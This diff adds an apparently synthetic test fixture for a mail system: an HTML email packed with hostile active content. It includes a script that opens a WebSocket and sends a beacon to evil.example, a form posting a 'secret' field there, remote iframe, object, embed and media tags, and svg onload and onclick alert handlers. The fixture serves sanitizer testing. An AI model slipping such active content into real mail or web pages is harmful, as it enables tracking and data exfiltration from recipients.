@@ -1,0 +1,15 @@
+Subject: OSMAP V4 hostile HTML active content fixture
+From: synthetic-attacker@example.invalid
+Content-Type: text/html; charset=utf-8
+
+<p>Visible hostile HTML fixture text.</p>
+<script>navigator.serviceWorker.register('/sw.js'); new WebSocket('wss://evil.example/socket'); navigator.sendBeacon('https://evil.example/beacon','x');</script>
+<form action="https://evil.example/post"><input name="secret" value="x"></form>
+<iframe src="https://evil.example/frame"></iframe>
+<object data="https://evil.example/object"></object>
+<embed src="https://evil.example/embed">
+<svg onload="alert(1)"><a href="https://evil.example/svg">svg text</a></svg>
+<math><mi>math text</mi></math>
+<audio src="https://evil.example/sound.mp3"></audio>
+<video src="https://evil.example/movie.mp4"></video>
+<p onclick="alert(1)">event handler text</p>
